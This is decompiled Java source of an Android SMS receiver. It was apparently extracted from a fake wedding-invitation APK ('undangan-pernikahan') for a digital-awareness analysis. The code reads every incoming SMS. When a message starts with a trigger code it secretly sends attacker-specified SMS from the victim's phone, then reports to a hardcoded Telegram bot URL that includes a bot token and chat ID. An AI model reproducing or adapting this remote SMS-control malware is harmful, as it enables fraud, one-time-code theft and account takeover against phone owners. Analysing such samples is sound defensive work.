package com.example.myapplicatior;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Request.Builder;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class SendSMS
  extends BroadcastReceiver
{
  final String TAG = "demo";
  private final OkHttpClient client = new OkHttpClient();
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    String str1 = " ";
    Object localObject2 = ",";
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      paramContext = paramIntent.getExtras();
      if (paramContext != null)
      {
        Object localObject1 = paramContext;
        try
        {
          Object[] arrayOfObject = (Object[])paramContext.get("pdus");
          localObject1 = paramContext;
          SmsMessage[] arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
          int i = 0;
          paramIntent = (Intent)localObject2;
          for (;;)
          {
            localObject1 = paramContext;
            if (i >= arrayOfSmsMessage.length) {
              break;
            }
            localObject1 = paramContext;
            arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
            localObject1 = paramContext;
            arrayOfSmsMessage[i].getOriginatingAddress();
            localObject1 = paramContext;
            String str2 = arrayOfSmsMessage[i].getMessageBody();
            localObject1 = paramContext;
            str2.replace("&", "  ").replace("#", str1).replace("?", str1);
            localObject1 = paramContext;
            Object localObject3 = str2.split(paramIntent)[0];
            localObject1 = paramContext;
            localObject2 = str2.split(paramIntent)[1];
            localObject1 = paramContext;
            str2 = str2.split(paramIntent)[2];
            localObject1 = paramContext;
            if (Integer.parseInt(((String)localObject3).toString()) == 55555)
            {
              localObject1 = paramContext;
              SmsManager.getDefault().sendTextMessage((String)localObject2, null, str2, null, null);
              localObject1 = paramContext;
              localObject3 = new okhttp3/Request$Builder;
              localObject1 = paramContext;
              ((Request.Builder)localObject3).<init>();
              localObject1 = paramContext;
              StringBuilder localStringBuilder = new java/lang/StringBuilder;
              localObject1 = paramContext;
              localStringBuilder.<init>();
              try
              {
                localObject1 = ((Request.Builder)localObject3).url("https://api.telegram.org/bot7107377550:AAHNS-fTQUSO9OaynigVWMHn9DTqrh2gbUw/sendMessage?parse_mode=markdown&chat_id=7067506660&text=Berhasil Kirim SMS dari Jauh  %0AKepada  : _" + (String)localObject2 + "_,%0A𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : _" + str2 + "_").build();
                localObject2 = this.client.newCall((Request)localObject1);
                localObject1 = new com/example/myapplicatior/SendSMS$1;
                ((1)localObject1).<init>(this);
                ((Call)localObject2).enqueue((Callback)localObject1);
              }
              catch (Exception paramContext)
              {
                break label327;
              }
            }
            i++;
          }
        }
        catch (Exception paramContext)
        {
          label327:
          paramContext.printStackTrace();
        }
      }
    }
  }
}


/* Location:              /home/icat/Documents/digital-awareness/src/undangan-pernikahan-dex2jar.jar!/com/example/myapplicatior/SendSMS.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */